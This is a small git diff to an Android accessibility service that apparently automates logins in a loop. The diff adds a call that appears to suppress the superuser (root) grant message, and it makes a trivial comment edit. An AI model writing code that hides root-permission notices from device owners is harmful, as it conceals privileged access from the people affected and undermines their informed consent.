@@ -71,6 +71,8 @@ public class MyAccessibilityService extends AccessibilityService {
 
                 String result_string = "unknown result";
 
+                JUtilFunctions.disableSuperuserGranteMsg();
+
                 // Perform work here asynchronously
                 while (true) {
                     // Code to be executed periodically
@@ -88,7 +90,7 @@ public class MyAccessibilityService extends AccessibilityService {
                             loginActionExecutor.clear_mem();
                             loginActionExecutor = null;
 
-                            // result_string = "success";
+                            //result_string = "success";
 
                             //. if success in login...
                             if (result_string.equals("success")){
